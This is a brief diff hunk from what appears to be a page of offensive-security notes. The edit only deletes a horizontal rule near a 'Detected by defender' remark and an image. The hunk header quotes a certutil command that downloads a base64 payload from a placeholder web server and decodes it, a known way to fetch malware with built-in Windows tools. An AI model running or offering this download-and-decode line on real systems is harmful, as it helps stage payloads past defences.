@@ -322,7 +322,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 **Detected by defender**
 
-***
+
 
 <figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
